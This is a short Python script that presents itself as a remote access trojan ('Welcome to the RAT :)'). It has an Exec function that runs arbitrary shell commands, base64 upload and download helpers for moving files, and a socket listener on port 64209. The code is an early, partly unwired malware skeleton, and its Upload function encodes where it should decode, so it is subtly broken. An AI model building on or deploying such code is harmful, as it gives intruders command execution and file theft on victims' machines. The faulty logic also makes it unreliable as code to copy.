import os
import sys
import base64
import socket
import subprocess

### Execute ###
def Exec(command):
    subprocess.Popen(command, shell=True)

### Upload ###
def Upload(b64String, outputFile):
    
    OutputText = base64.b64encode(b64String)
    
    OutputFile = open(outputFile, 'wb')
    OutputFile.write(OutputText)

    
### Download ###
def Download(fileName):
    localFile = open(fileName, 'rb')
    OutputText = base64.b64encode(localFile.read())
    print(OutputText)
    localFile.close()
    return OutputText

HEADERSIZE = 10


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((socket.gethostname(), 64209))
    s.listen(1)
    while True:
        clientsocket, address = s.accept()
        print(f"Found connection at {address}! Connection successful!")
        messageForClient = "Welcome to the RAT :)"
        messageForClient = f'{len(messageForClient):<{HEADERSIZE}}' + messageForClient
        clientsocket.send(bytes(messageForClient, "UTF-8"))
        

if __name__ == '__main__':
    main()
